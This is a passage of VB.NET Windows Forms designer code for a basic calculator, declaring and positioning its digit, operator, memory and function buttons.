Public Class Form1
    Inherits System.Windows.Forms.Form

#Region " Windows Form Designer generated code "

    Public Sub New()
        MyBase.New()

        'This call is required by the Windows Form Designer.
        InitializeComponent()

        'Add any initialization after the InitializeComponent() call
        period = False
        Status = False
        Memory = 0
        Temp = 0
    End Sub

    'Form overrides dispose to clean up the component list.
    Protected Overloads Overrides Sub Dispose(ByVal disposing As Boolean)
        If disposing Then
            If Not (components Is Nothing) Then
                components.Dispose()
            End If
        End If
        MyBase.Dispose(disposing)
    End Sub

    'Required by the Windows Form Designer
    Private components As System.ComponentModel.IContainer

    'NOTE: The following procedure is required by the Windows Form Designer
    'It can be modified using the Windows Form Designer.  
    'Do not modify it using the code editor.
    Friend WithEvents TextBox1 As System.Windows.Forms.TextBox
    Public WithEvents btnNumPeriod As System.Windows.Forms.Button
    Public WithEvents btn_Num_0 As System.Windows.Forms.Button
    Public WithEvents btn_Num_9 As System.Windows.Forms.Button
    Public WithEvents btn_Num_8 As System.Windows.Forms.Button
    Public WithEvents btn_Num_7 As System.Windows.Forms.Button
    Public WithEvents btn_Num_6 As System.Windows.Forms.Button
    Public WithEvents btn_Num_5 As System.Windows.Forms.Button
    Public WithEvents btn_Num_4 As System.Windows.Forms.Button
    Public WithEvents btn_Num_3 As System.Windows.Forms.Button
    Public WithEvents btn_Num_2 As System.Windows.Forms.Button
    Public WithEvents btn_Num_1 As System.Windows.Forms.Button
    Public WithEvents btn_Operator_Add As System.Windows.Forms.Button
    Public WithEvents btn_Operator_Subt As System.Windows.Forms.Button
    Public WithEvents btn_Operator_div As System.Windows.Forms.Button
    Public WithEvents btn_Operator_Multi As System.Windows.Forms.Button
    Public WithEvents btnCalculate As System.Windows.Forms.Button
    Public WithEvents btnMemoryRecall As System.Windows.Forms.Button
    Public WithEvents btnMemoryMinus As System.Windows.Forms.Button
    Public WithEvents btnMemoryPlus As System.Windows.Forms.Button
    Public WithEvents btnCLR As System.Windows.Forms.Button
    Public WithEvents btnBackspace As System.Windows.Forms.Button
    Public WithEvents btnCLR_Curr As System.Windows.Forms.Button
    Public WithEvents btnMemStatus As System.Windows.Forms.Button
    Public WithEvents btnSqrt As System.Windows.Forms.Button
    Public WithEvents btnInverse As System.Windows.Forms.Button
    Public WithEvents btnnumSign As System.Windows.Forms.Button
    Public WithEvents btnPow As System.Windows.Forms.Button
    <System.Diagnostics.DebuggerStepThrough()> Private Sub InitializeComponent()
        Dim resources As System.ComponentModel.ComponentResourceManager = New System.ComponentModel.ComponentResourceManager(GetType(Form1))
        Me.TextBox1 = New System.Windows.Forms.TextBox()
        Me.btnNumPeriod = New System.Windows.Forms.Button()
        Me.btn_Num_0 = New System.Windows.Forms.Button()
        Me.btn_Num_9 = New System.Windows.Forms.Button()
        Me.btn_Num_8 = New System.Windows.Forms.Button()
        Me.btn_Num_7 = New System.Windows.Forms.Button()
        Me.btn_Num_6 = New System.Windows.Forms.Button()
        Me.btn_Num_5 = New System.Windows.Forms.Button()
        Me.btn_Num_4 = New System.Windows.Forms.Button()
        Me.btn_Num_3 = New System.Windows.Forms.Button()
        Me.btn_Num_2 = New System.Windows.Forms.Button()
        Me.btn_Num_1 = New System.Windows.Forms.Button()
        Me.btn_Operator_Add = New System.Windows.Forms.Button()
        Me.btn_Operator_Subt = New System.Windows.Forms.Button()
        Me.btnPow = New System.Windows.Forms.Button()
        Me.btn_Operator_div = New System.Windows.Forms.Button()
        Me.btn_Operator_Multi = New System.Windows.Forms.Button()
        Me.btnCalculate = New System.Windows.Forms.Button()
        Me.btnMemoryRecall = New System.Windows.Forms.Button()
        Me.btnMemoryMinus = New System.Windows.Forms.Button()
        Me.btnMemoryPlus = New System.Windows.Forms.Button()
        Me.btnCLR = New System.Windows.Forms.Button()
        Me.btnBackspace = New System.Windows.Forms.Button()
        Me.btnCLR_Curr = New System.Windows.Forms.Button()
        Me.btnMemStatus = New System.Windows.Forms.Button()
        Me.btnSqrt = New System.Windows.Forms.Button()
        Me.btnInverse = New System.Windows.Forms.Button()
        Me.btnnumSign = New System.Windows.Forms.Button()
        Me.SuspendLayout()
        '
        'TextBox1
        '
        Me.TextBox1.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle
        Me.TextBox1.Location = New System.Drawing.Point(8, 16)
        Me.TextBox1.Name = "TextBox1"
        Me.TextBox1.ReadOnly = True
        Me.TextBox1.RightToLeft = System.Windows.Forms.RightToLeft.Yes
        Me.TextBox1.Size = New System.Drawing.Size(256, 20)
        Me.TextBox1.TabIndex = 0
        '
        'btnNumPeriod
        '
        Me.btnNumPeriod.BackColor = System.Drawing.SystemColors.Control
        Me.btnNumPeriod.Cursor = System.Windows.Forms.Cursors.Default
        Me.btnNumPeriod.FlatStyle = System.Windows.Forms.FlatStyle.Popup
        Me.btnNumPeriod.Font = New System.Drawing.Font("Verdana", 9.75!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.btnNumPeriod.ForeColor = System.Drawing.SystemColors.Highlight
        Me.btnNumPeriod.Location = New System.Drawing.Point(136, 168)
        Me.btnNumPeriod.Name = "btnNumPeriod"
        Me.btnNumPeriod.RightToLeft = System.Windows.Forms.RightToLeft.No
        Me.btnNumPeriod.Size = New System.Drawing.Size(31, 22)
        Me.btnNumPeriod.TabIndex = 40
        Me.btnNumPeriod.Text = "."
        Me.btnNumPeriod.UseVisualStyleBackColor = False
        '
        'btn_Num_0
        '
        Me.btn_Num_0.BackColor = System.Drawing.SystemColors.Control
        Me.btn_Num_0.Cursor = System.Windows.Forms.Cursors.Default
        Me.btn_Num_0.FlatStyle = System.Windows.Forms.FlatStyle.Popup
        Me.btn_Num_0.Font = New System.Drawing.Font("Verdana", 9.75!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.btn_Num_0.ForeColor = System.Drawing.Color.Blue
        Me.btn_Num_0.Location = New System.Drawing.Point(56, 168)
        Me.btn_Num_0.Name = "btn_Num_0"
        Me.btn_Num_0.RightToLeft = System.Windows.Forms.RightToLeft.No
        Me.btn_Num_0.Size = New System.Drawing.Size(31, 22)
        Me.btn_Num_0.TabIndex = 39
        Me.btn_Num_0.Text = "0"
        Me.btn_Num_0.UseVisualStyleBackColor = False
        '
        'btn_Num_9
        '
        Me.btn_Num_9.BackColor = System.Drawing.SystemColors.Control
        Me.btn_Num_9.Cursor = System.Windows.Forms.Cursors.Default
        Me.btn_Num_9.FlatStyle = System.Windows.Forms.FlatStyle.Popup
        Me.btn_Num_9.Font = New System.Drawing.Font("Verdana", 9.75!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.btn_Num_9.ForeColor = System.Drawing.Color.Blue
        Me.btn_Num_9.Location = New System.Drawing.Point(136, 96)
        Me.btn_Num_9.Name = "btn_Num_9"
        Me.btn_Num_9.RightToLeft = System.Windows.Forms.RightToLeft.No
        Me.btn_Num_9.Size = New System.Drawing.Size(31, 21)
        Me.btn_Num_9.TabIndex = 38
        Me.btn_Num_9.Text = "9"
        Me.btn_Num_9.UseVisualStyleBackColor = False
        '
        'btn_Num_8
        '
        Me.btn_Num_8.BackColor = System.Drawing.SystemColors.Control
        Me.btn_Num_8.Cursor = System.Windows.Forms.Cursors.Default
        Me.btn_Num_8.FlatStyle = System.Windows.Forms.FlatStyle.Popup
        Me.btn_Num_8.Font = New System.Drawing.Font("Verdana", 9.75!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.btn_Num_8.ForeColor = System.Drawing.Color.Blue
        Me.btn_Num_8.Location = New System.Drawing.Point(96, 96)
        Me.btn_Num_8.Name = "btn_Num_8"
        Me.btn_Num_8.RightToLeft = System.Windows.Forms.RightToLeft.No
        Me.btn_Num_8.Size = New System.Drawing.Size(31, 22)
        Me.btn_Num_8.TabIndex = 37
        Me.btn_Num_8.Text = "8"
        Me.btn_Num_8.UseVisualStyleBackColor = False
        '
        'btn_Num_7
        '
        Me.btn_Num_7.BackColor = System.Drawing.SystemColors.Control
        Me.btn_Num_7.Cursor = System.Windows.Forms.Cursors.Default
        Me.btn_Num_7.FlatStyle = System.Windows.Forms.FlatStyle.Popup
        Me.btn_Num_7.Font = New System.Drawing.Font("Verdana", 9.75!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.btn_Num_7.ForeColor = System.Drawing.Color.Blue
        Me.btn_Num_7.Location = New System.Drawing.Point(56, 96)
        Me.btn_Num_7.Name = "btn_Num_7"
        Me.btn_Num_7.RightToLeft = System.Windows.Forms.RightToLeft.No
        Me.btn_Num_7.Size = New System.Drawing.Size(31, 21)
        Me.btn_Num_7.TabIndex = 36
        Me.btn_Num_7.Text = "7"
        Me.btn_Num_7.UseVisualStyleBackColor = False
        '
        'btn_Num_6
        '
        Me.btn_Num_6.BackColor = System.Drawing.SystemColors.Control
        Me.btn_Num_6.Cursor = System.Windows.Forms.Cursors.Default
        Me.btn_Num_6.FlatStyle = System.Windows.Forms.FlatStyle.Popup
        Me.btn_Num_6.Font = New System.Drawing.Font("Verdana", 9.75!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.btn_Num_6.ForeColor = System.Drawing.Color.Blue
        Me.btn_Num_6.Location = New System.Drawing.Point(136, 120)
        Me.btn_Num_6.Name = "btn_Num_6"
        Me.btn_Num_6.RightToLeft = System.Windows.Forms.RightToLeft.No
        Me.btn_Num_6.Size = New System.Drawing.Size(31, 22)
        Me.btn_Num_6.TabIndex = 35
        Me.btn_Num_6.Text = "6"
        Me.btn_Num_6.UseVisualStyleBackColor = False
        '
        'btn_Num_5
        '
        Me.btn_Num_5.BackColor = System.Drawing.SystemColors.Control
        Me.btn_Num_5.Cursor = System.Windows.Forms.Cursors.Default
        Me.btn_Num_5.FlatStyle = System.Windows.Forms.FlatStyle.Popup
        Me.btn_Num_5.Font = New System.Drawing.Font("Verdana", 9.75!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.btn_Num_5.ForeColor = System.Drawing.Color.Blue
        Me.btn_Num_5.Location = New System.Drawing.Point(96, 120)
        Me.btn_Num_5.Name = "btn_Num_5"
        Me.btn_Num_5.RightToLeft = System.Windows.Forms.RightToLeft.No
        Me.btn_Num_5.Size = New System.Drawing.Size(31, 22)
        Me.btn_Num_5.TabIndex = 34
        Me.btn_Num_5.Text = "5"
        Me.btn_Num_5.UseVisualStyleBackColor = False
        '
        'btn_Num_4
        '
        Me.btn_Num_4.BackColor = System.Drawing.SystemColors.Control
        Me.btn_Num_4.Cursor = System.Windows.Forms.Cursors.Default
        Me.btn_Num_4.FlatStyle = System.Windows.Forms.FlatStyle.Popup
        Me.btn_Num_4.Font = New System.Drawing.Font("Verdana", 9.75!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.btn_Num_4.ForeColor = System.Drawing.Color.Blue
        Me.btn_Num_4.Location = New System.Drawing.Point(56, 120)
        Me.btn_Num_4.Name = "btn_Num_4"
        Me.btn_Num_4.RightToLeft = System.Windows.Forms.RightToLeft.No
        Me.btn_Num_4.Size = New System.Drawing.Size(31, 22)
        Me.btn_Num_4.TabIndex = 33
        Me.btn_Num_4.Text = "4"
        Me.btn_Num_4.UseVisualStyleBackColor = False
        '
        'btn_Num_3
        '
        Me.btn_Num_3.BackColor = System.Drawing.SystemColors.Control
        Me.btn_Num_3.Cursor = System.Windows.Forms.Cursors.Default
        Me.btn_Num_3.FlatStyle = System.Windows.Forms.FlatStyle.Popup
        Me.btn_Num_3.Font = New System.Drawing.Font("Verdana", 9.75!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.btn_Num_3.ForeColor = System.Drawing.Color.Blue
        Me.btn_Num_3.Location = New System.Drawing.Point(136, 144)
        Me.btn_Num_3.Name = "btn_Num_3"
        Me.btn_Num_3.RightToLeft = System.Windows.Forms.RightToLeft.No
        Me.btn_Num_3.Size = New System.Drawing.Size(31, 22)
        Me.btn_Num_3.TabIndex = 32
        Me.btn_Num_3.Text = "3"
        Me.btn_Num_3.UseVisualStyleBackColor = False
        '
        'btn_Num_2
        '
        Me.btn_Num_2.BackColor = System.Drawing.SystemColors.Control
        Me.btn_Num_2.Cursor = System.Windows.Forms.Cursors.Default
        Me.btn_Num_2.FlatStyle = System.Windows.Forms.FlatStyle.Popup
        Me.btn_Num_2.Font = New System.Drawing.Font("Verdana", 9.75!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.btn_Num_2.ForeColor = System.Drawing.Color.Blue
        Me.btn_Num_2.Location = New System.Drawing.Point(96, 144)
        Me.btn_Num_2.Name = "btn_Num_2"
        Me.btn_Num_2.RightToLeft = System.Windows.Forms.RightToLeft.No
        Me.btn_Num_2.Size = New System.Drawing.Size(31, 22)
        Me.btn_Num_2.TabIndex = 31
        Me.btn_Num_2.Text = "2"
        Me.btn_Num_2.UseVisualStyleBackColor = False
        '
        'btn_Num_1
        '
        Me.btn_Num_1.BackColor = System.Drawing.SystemColors.Control
        Me.btn_Num_1.Cursor = System.Windows.Forms.Cursors.Default
        Me.btn_Num_1.FlatStyle = System.Windows.Forms.FlatStyle.Popup
        Me.btn_Num_1.Font = New System.Drawing.Font("Verdana", 9.75!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.btn_Num_1.ForeColor = System.Drawing.Color.Blue
        Me.btn_Num_1.Location = New System.Drawing.Point(56, 144)
        Me.btn_Num_1.Name = "btn_Num_1"
        Me.btn_Num_1.RightToLeft = System.Windows.Forms.RightToLeft.No
        Me.btn_Num_1.Size = New System.Drawing.Size(31, 22)
        Me.btn_Num_1.TabIndex = 30
        Me.btn_Num_1.Text = "1"
        Me.btn_Num_1.UseVisualStyleBackColor = False
        '
        'btn_Operator_Add
        '
        Me.btn_Operator_Add.BackColor = System.Drawing.SystemColors.Control
        Me.btn_Operator_Add.Cursor = System.Windows.Forms.Cursors.Default
        Me.btn_Operator_Add.FlatStyle = System.Windows.Forms.FlatStyle.Popup
        Me.btn_Operator_Add.Font = New System.Drawing.Font("Verdana", 11.25!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.btn_Operator_Add.ForeColor = System.Drawing.Color.FromArgb(CType(CType(192, Byte), Integer), CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer))
        Me.btn_Operator_Add.Location = New System.Drawing.Point(176, 96)
        Me.btn_Operator_Add.Name = "btn_Operator_Add"
        Me.btn_Operator_Add.RightToLeft = System.Windows.Forms.RightToLeft.No
        Me.btn_Operator_Add.Size = New System.Drawing.Size(31, 21)
        Me.btn_Operator_Add.TabIndex = 55
        Me.btn_Operator_Add.Text = "+"
        Me.btn_Operator_Add.UseVisualStyleBackColor = False
        '
        'btn_Operator_Subt
        '
        Me.btn_Operator_Subt.BackColor = System.Drawing.SystemColors.Control
        Me.btn_Operator_Subt.Cursor = System.Windows.Forms.Cursors.Default
        Me.btn_Operator_Subt.FlatStyle = System.Windows.Forms.FlatStyle.Popup
        Me.btn_Operator_Subt.Font = New System.Drawing.Font("Verdana", 11.25!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.btn_Operator_Subt.ForeColor = System.Drawing.Color.FromArgb(CType(CType(192, Byte), Integer), CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer))
        Me.btn_Operator_Subt.Location = New System.Drawing.Point(176, 120)
        Me.btn_Operator_Subt.Name = "btn_Operator_Subt"
        Me.btn_Operator_Subt.RightToLeft = System.Windows.Forms.RightToLeft.No
        Me.btn_Operator_Subt.Size = New System.Drawing.Size(31, 22)
        Me.btn_Operator_Subt.TabIndex = 54
        Me.btn_Operator_Subt.Text = "-"
        Me.btn_Operator_Subt.UseVisualStyleBackColor = False
        '
        'btnPow
        '
        Me.btnPow.BackColor = System.Drawing.SystemColors.Control
        Me.btnPow.Cursor = System.Windows.Forms.Cursors.Default
        Me.btnPow.FlatStyle = System.Windows.Forms.FlatStyle.Popup
        Me.btnPow.Font = New System.Drawing.Font("Verdana", 9.75!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.btnPow.ForeColor = System.Drawing.SystemColors.Desktop
        Me.btnPow.Location = New System.Drawing.Point(216, 120)
        Me.btnPow.Name = "btnPow"
        Me.btnPow.RightToLeft = System.Windows.Forms.RightToLeft.No
        Me.btnPow.Size = New System.Drawing.Size(40, 22)
        Me.btnPow.TabIndex = 53
        Me.btnPow.Text = "x^"
        Me.btnPow.UseVisualStyleBackColor = False
        '
        'btn_Operator_div
        '
        Me.btn_Operator_div.BackColor = System.Drawing.SystemColors.Control
        Me.btn_Operator_div.Cursor = System.Windows.Forms.Cursors.Default
        Me.btn_Operator_div.FlatStyle = System.Windows.Forms.FlatStyle.Popup
        Me.btn_Operator_div.Font = New System.Drawing.Font("Verdana", 9.75!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.btn_Operator_div.ForeColor = System.Drawing.Color.FromArgb(CType(CType(192, Byte), Integer), CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer))
        Me.btn_Operator_div.Location = New System.Drawing.Point(176, 168)
        Me.btn_Operator_div.Name = "btn_Operator_div"
        Me.btn_Operator_div.RightToLeft = System.Windows.Forms.RightToLeft.No
        Me.btn_Operator_div.Size = New System.Drawing.Size(31, 22)
        Me.btn_Operator_div.TabIndex = 52
        Me.btn_Operator_div.Text = "/"
        Me.btn_Operator_div.UseVisualStyleBackColor = False
        '
        'btn_Operator_Multi
        '
        Me.btn_Operator_Multi.BackColor = System.Drawing.SystemColors.Control
        Me.btn_Operator_Multi.Cursor = System.Windows.Forms.Cursors.Default
        Me.btn_Operator_Multi.FlatStyle = System.Windows.Forms.FlatStyle.Popup
        Me.btn_Operator_Multi.Font = New System.Drawing.Font("Verdana", 9.75!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.btn_Operator_Multi.ForeColor = System.Drawing.Color.FromArgb(CType(CType(192, Byte), Integer), CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer))
        Me.btn_Operator_Multi.Location = New System.Drawing.Point(176, 144)
        Me.btn_Operator_Multi.Name = "btn_Operator_Multi"
        Me.btn_Operator_Multi.RightToLeft = System.Windows.Forms.RightToLeft.No
        Me.btn_Operator_Multi.Size = New System.Drawing.Size(31, 22)
        Me.btn_Operator_Multi.TabIndex = 51
        Me.btn_Operator_Multi.Text = "x"
        Me.btn_Operator_Multi.TextAlign = System.Drawing.ContentAlignment.BottomCenter
        Me.btn_Operator_Multi.UseVisualStyleBackColor = False
        '
        'btnCalculate
        '
        Me.btnCalculate.BackColor = System.Drawing.SystemColors.Control
        Me.btnCalculate.Cursor = System.Windows.Forms.Cursors.Default
        Me.btnCalculate.FlatStyle = System.Windows.Forms.FlatStyle.Popup
        Me.btnCalculate.Font = New System.Drawing.Font("Verdana", 11.25!, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.btnCalculate.ForeColor = System.Drawing.Color.FromArgb(CType(CType(192, Byte), Integer), CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer))
        Me.btnCalculate.Location = New System.Drawing.Point(216, 168)
        Me.btnCalculate.Name = "btnCalculate"
        Me.btnCalculate.RightToLeft = System.Windows.Forms.RightToLeft.No
        Me.btnCalculate.Size = New System.Drawing.Size(40, 21)
        Me.btnCalculate.TabIndex = 50
        Me.btnCalculate.Text = "="
        Me.btnCalculate.UseVisualStyleBackColor = False
        '
        'btnMemoryRecall
        '
        Me.btnMemoryRecall.BackColor = System.Drawing.SystemColors.Control
        Me.btnMemoryRecall.Cursor = System.Windows.Forms.Cursors.Default
        Me.btnMemoryRecall.FlatStyle = System.Windows.Forms.FlatStyle.Popup
        Me.btnMemoryRecall.Font = New System.Drawing.Font("Verdana", 9.75!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.btnMemoryRecall.ForeColor = System.Drawing.Color.FromArgb(CType(CType(192, Byte), Integer), CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer))
        Me.btnMemoryRecall.Location = New System.Drawing.Point(8, 96)
        Me.btnMemoryRecall.Name = "btnMemoryRecall"
        Me.btnMemoryRecall.RightToLeft = System.Windows.Forms.RightToLeft.No
        Me.btnMemoryRecall.Size = New System.Drawing.Size(36, 24)
        Me.btnMemoryRecall.TabIndex = 61
        Me.btnMemoryRecall.Text = "MR"
        Me.btnMemoryRecall.UseVisualStyleBackColor = False
        '
        'btnMemoryMinus
        '
        Me.btnMemoryMinus.BackColor = System.Drawing.SystemColors.Control
        Me.btnMemoryMinus.Cursor = System.Windows.Forms.Cursors.Default
        Me.btnMemoryMinus.FlatStyle = System.Windows.Forms.FlatStyle.Popup
        Me.btnMemoryMinus.Font = New System.Drawing.Font("Verdana", 9.75!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.btnMemoryMinus.ForeColor = System.Drawing.Color.FromArgb(CType(CType(192, Byte), Integer), CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer))
        Me.btnMemoryMinus.Location = New System.Drawing.Point(8, 168)
        Me.btnMemoryMinus.Name = "btnMemoryMinus"
        Me.btnMemoryMinus.RightToLeft = System.Windows.Forms.RightToLeft.No
        Me.btnMemoryMinus.Size = New System.Drawing.Size(36, 24)
        Me.btnMemoryMinus.TabIndex = 60
        Me.btnMemoryMinus.Text = "M-"
        Me.btnMemoryMinus.UseVisualStyleBackColor = False
        '
        'btnMemoryPlus
        '
        Me.btnMemoryPlus.BackColor = System.Drawing.SystemColors.Control
        Me.btnMemoryPlus.Cursor = System.Windows.Forms.Cursors.Default
        Me.btnMemoryPlus.FlatStyle = System.Windows.Forms.FlatStyle.Popup
        Me.btnMemoryPlus.Font = New System.Drawing.Font("Verdana", 9.75!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.btnMemoryPlus.ForeColor = System.Drawing.Color.FromArgb(CType(CType(192, Byte), Integer), CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer))
        Me.btnMemoryPlus.Location = New System.Drawing.Point(8, 132)
        Me.btnMemoryPlus.Name = "btnMemoryPlus"
        Me.btnMemoryPlus.RightToLeft = System.Windows.Forms.RightToLeft.No
        Me.btnMemoryPlus.Size = New System.Drawing.Size(36, 22)
        Me.btnMemoryPlus.TabIndex = 59
        Me.btnMemoryPlus.Text = "M+"
        Me.btnMemoryPlus.UseVisualStyleBackColor = False
        '
        'btnCLR
        '
        Me.btnCLR.BackColor = System.Drawing.SystemColors.Control
        Me.btnCLR.Cursor = System.Windows.Forms.Cursors.Default
        Me.btnCLR.FlatStyle = System.Windows.Forms.FlatStyle.Popup
        Me.btnCLR.Font = New System.Drawing.Font("Verdana", 9.75!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.btnCLR.ForeColor = System.Drawing.Color.FromArgb(CType(CType(192, Byte), Integer), CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer))
        Me.btnCLR.Location = New System.Drawing.Point(200, 56)
        Me.btnCLR.Name = "btnCLR"
        Me.btnCLR.RightToLeft = System.Windows.Forms.RightToLeft.No
        Me.btnCLR.Size = New System.Drawing.Size(56, 22)
        Me.btnCLR.TabIndex = 58
        Me.btnCLR.Text = "C"
        Me.btnCLR.UseVisualStyleBackColor = False
        '
        'btnBackspace
        '
        Me.btnBackspace.BackColor = System.Drawing.SystemColors.Control
        Me.btnBackspace.Cursor = System.Windows.Forms.Cursors.Default
        Me.btnBackspace.FlatStyle = System.Windows.Forms.FlatStyle.Popup
        Me.btnBackspace.Font = New System.Drawing.Font("Verdana", 8.25!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.btnBackspace.ForeColor = System.Drawing.Color.FromArgb(CType(CType(192, Byte), Integer), CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer))
        Me.btnBackspace.Location = New System.Drawing.Point(56, 56)
        Me.btnBackspace.Name = "btnBackspace"
        Me.btnBackspace.RightToLeft = System.Windows.Forms.RightToLeft.No
        Me.btnBackspace.Size = New System.Drawing.Size(80, 22)
        Me.btnBackspace.TabIndex = 57
        Me.btnBackspace.Text = "Backspace"
        Me.btnBackspace.UseVisualStyleBackColor = False
        '
        'btnCLR_Curr
        '
        Me.btnCLR_Curr.BackColor = System.Drawing.SystemColors.Control
        Me.btnCLR_Curr.Cursor = System.Windows.Forms.Cursors.Default
        Me.btnCLR_Curr.FlatStyle = System.Windows.Forms.FlatStyle.Popup
        Me.btnCLR_Curr.Font = New System.Drawing.Font("Verdana", 9.75!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.btnCLR_Curr.ForeColor = System.Drawing.Color.FromArgb(CType(CType(192, Byte), Integer), CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer))
        Me.btnCLR_Curr.Location = New System.Drawing.Point(144, 56)
        Me.btnCLR_Curr.Name = "btnCLR_Curr"
        Me.btnCLR_Curr.RightToLeft = System.Windows.Forms.RightToLeft.No
        Me.btnCLR_Curr.Size = New System.Drawing.Size(48, 22)
        Me.btnCLR_Curr.TabIndex = 56
        Me.btnCLR_Curr.Text = "CE"
        Me.btnCLR_Curr.UseVisualStyleBackColor = False
        '
        'btnMemStatus
        '
        Me.btnMemStatus.BackColor = System.Drawing.SystemColors.Control
        Me.btnMemStatus.Cursor = System.Windows.Forms.Cursors.Default
        Me.btnMemStatus.Enabled = False
        Me.btnMemStatus.FlatStyle = System.Windows.Forms.FlatStyle.Popup
        Me.btnMemStatus.Font = New System.Drawing.Font("Verdana", 9.75!, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.btnMemStatus.ForeColor = System.Drawing.Color.DarkOliveGreen
        Me.btnMemStatus.Location = New System.Drawing.Point(8, 56)
        Me.btnMemStatus.Name = "btnMemStatus"
        Me.btnMemStatus.RightToLeft = System.Windows.Forms.RightToLeft.No
        Me.btnMemStatus.Size = New System.Drawing.Size(36, 32)
        Me.btnMemStatus.TabIndex = 62
        Me.btnMemStatus.UseVisualStyleBackColor = False
        '
        'btnSqrt
        '
        Me.btnSqrt.BackColor = System.Drawing.SystemColors.Control
        Me.btnSqrt.Cursor = System.Windows.Forms.Cursors.Default
        Me.btnSqrt.FlatStyle = System.Windows.Forms.FlatStyle.Popup
        Me.btnSqrt.Font = New System.Drawing.Font("Verdana", 8.25!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.btnSqrt.ForeColor = System.Drawing.SystemColors.Desktop
        Me.btnSqrt.Location = New System.Drawing.Point(216, 96)
        Me.btnSqrt.Name = "btnSqrt"
        Me.btnSqrt.RightToLeft = System.Windows.Forms.RightToLeft.No
        Me.btnSqrt.Size = New System.Drawing.Size(40, 22)
        Me.btnSqrt.TabIndex = 63
        Me.btnSqrt.Text = "sqrt"
        Me.btnSqrt.UseVisualStyleBackColor = False
        '
        'btnInverse
        '
        Me.btnInverse.BackColor = System.Drawing.SystemColors.Control
        Me.btnInverse.Cursor = System.Windows.Forms.Cursors.Default
        Me.btnInverse.FlatStyle = System.Windows.Forms.FlatStyle.Popup
        Me.btnInverse.Font = New System.Drawing.Font("Verdana", 9.75!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.btnInverse.ForeColor = System.Drawing.SystemColors.Desktop
        Me.btnInverse.Location = New System.Drawing.Point(216, 144)
        Me.btnInverse.Name = "btnInverse"
        Me.btnInverse.RightToLeft = System.Windows.Forms.RightToLeft.No
        Me.btnInverse.Size = New System.Drawing.Size(40, 22)
        Me.btnInverse.TabIndex = 64
        Me.btnInverse.Text = "1/x"
        Me.btnInverse.UseVisualStyleBackColor = False
        '
        'btnnumSign
        '
        Me.btnnumSign.BackColor = System.Drawing.SystemColors.Control
        Me.btnnumSign.Cursor = System.Windows.Forms.Cursors.Default
        Me.btnnumSign.FlatStyle = System.Windows.Forms.FlatStyle.Popup
        Me.btnnumSign.Font = New System.Drawing.Font("Verdana", 6.0!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.btnnumSign.ForeColor = System.Drawing.Color.Blue
        Me.btnnumSign.Location = New System.Drawing.Point(96, 168)
        Me.btnnumSign.Name = "btnnumSign"
        Me.btnnumSign.RightToLeft = System.Windows.Forms.RightToLeft.No
        Me.btnnumSign.Size = New System.Drawing.Size(31, 22)
        Me.btnnumSign.TabIndex = 65
        Me.btnnumSign.Text = "+/-"
        Me.btnnumSign.UseVisualStyleBackColor = False
        '
        'Form1
        '
        Me.AutoScaleBaseSize = New System.Drawing.Size(6, 13)
        Me.ClientSize = New System.Drawing.Size(272, 201)
        Me.Controls.Add(Me.btnnumSign)
        Me.Controls.Add(Me.btnInverse)
        Me.Controls.Add(Me.btnSqrt)
        Me.Controls.Add(Me.btnMemStatus)
        Me.Controls.Add(Me.btnMemoryRecall)
        Me.Controls.Add(Me.btnMemoryMinus)
        Me.Controls.Add(Me.btnMemoryPlus)
        Me.Controls.Add(Me.btnCLR)
        Me.Controls.Add(Me.btnBackspace)
